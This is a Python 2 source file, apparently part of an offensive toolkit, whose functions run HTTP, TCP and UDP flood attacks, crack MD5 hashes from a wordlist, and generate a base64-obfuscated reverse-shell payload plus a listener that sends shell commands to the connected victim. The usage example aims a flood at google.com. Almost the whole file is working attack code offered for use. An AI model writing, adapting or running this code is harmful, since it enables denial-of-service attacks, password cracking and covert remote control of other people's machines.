import os.path
scs = {'ddos':['flood/http','flood/tcp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell']}
opt1 = ''
opt2 = ''
infos = {'flood/http':
	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/tcp':
	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/udp':
	'Options:\nhost .... target to attack    '+opt1+'\n','offline/hashkiller':'Options:\nhash .... hash to crack    '+opt1+'\nwordlist .... wordlist to use    '+opt2,
	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2
}
def options(script,_opt1,_opt2):
	global opt1
	global opt2
	opt1 = _opt1
	opt2 = _opt2
	if script != '':
		print infos[script]
	else:
		print '[!] Please select a script first'
		print 'Ex: "set_script <scriptname>"'
def floodhttp(host,port):
	import requests, sys
	url = 'http://'+host+':'+port
	counter = 0
	while 1:
		try:
			counter += 1
			requests.get(url)
			sys.stdout.write('\r[+] Sending request '+str(counter)+' to '+host+':'+port)
		except KeyboardInterrupt:
			break
			print ''
		except requests.exceptions.ConnectionError:
			print 'Invalid host/port\n'
			break
def usage():
	print '# Usage example:'
	print '\tlazy# use 1'
	print '\tlazy/ddos# set_script flood/http'
	print '\tlazy/ddos/flood/http# set host=google.com'
	print '\tlazy/ddos/flood/http# set port=80'
	print '\tlazy/ddos/flood/http# run\n'
	
def floodtcp(host,port):
	import socket, random, sys
	port = int(port)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	counter = 0
	while 1:
		try:
			counter +=1
			msg = random._urandom(1024)
			s.send(msg)
			sys.stdout.write('\r'+str(counter)+': Sending '+str(len(msg))+' bytes to '+host+':'+str(port))
		except KeyboardInterrupt:
			s.close()
			break
def floodudp(host):
	from socket import socket, AF_INET, SOCK_DGRAM
	import random, sys
	s = socket(AF_INET, SOCK_DGRAM)
	while 1:
		try:
			data = random._urandom(2048)
			port = random.randint(80,8080)
			s.sendto(data, (host, port))
			sys.stdout.write('\r[+] Sending '+str(len(data))+' bytes to '+host+':'+str(port))
		except KeyboardInterrupt:
			s.close()
			break
def hashkiller(wordl, hash):
	import hashlib, sys
	wl = open(wordl)
	rd = wl.readlines()
	for i in rd:
		if i.endswith('\n'):
			i = i.replace('\n','')
		sys.stdout.write('\r[*] Atual word: %s' %i)
		sys.stdout.flush()
		if hashlib.md5(i).hexdigest() == hash:
			print '\n[+] Hash founded!'
			print 'Your hash is: %s' % i
			break
		else:
			pass
	wl.close()

def listener():
	port = int(raw_input('Port to listen at: '))
	from socket import socket
	s = socket()
	host = ('', port)
	s.bind(host)
	s.listen(5)
	print '[*] Listener started at port %i' % port
	while 1:
		try:
			c, addr = s.accept()
			print '[+] Connection from', addr
			while True:
				cmd = raw_input('shell# ')
				c.send(cmd)
				print c.recv(1024)
		except KeyboardInterrupt:
			break
			exit()
	s.close

def fud_shell(lhost, lport):
	pth = raw_input('File name (ex: payload.pyw): ')
	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(1024)\n\tif conn[:2] == "cd":\n\t\tos.chdir(str(conn[3:]))\n\t\tconn=" "\n\t\ts.send(conn)\n\telse:\n\t\tcmd = os.popen(conn).read()\n\t\ts.sendall(cmd+"\\n")'
	_file = open(pth,'w')
	print '[*] Enconding'
	enc = payload.encode('base64').replace('\n','')
	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
	_file.close()
	print '[+] File saved as: %s\n' % pth
	quest = raw_input('[*] Do you wanna start listener right now? (y/n): ')
	if quest.lower() == 'y':
		listener()
	else:
		print '[!] Exiting ...\n' 

def run(script, opt1, opt2):
	if script == 'flood/http':
		floodhttp(opt1,opt2)
	if script == 'flood/tcp':
		floodtcp(opt1,opt2)
	if script == 'flood/udp':
		floodudp(opt1)
	if script == 'offline/hashkiller':
		if os.path.isfile(opt1):
			hashkiller(opt1, opt2)
		else:
			print 'Wordlist file dont exist!'
	if script == 'fud/python/reverse_shell':
		fud_shell(opt1, opt2)
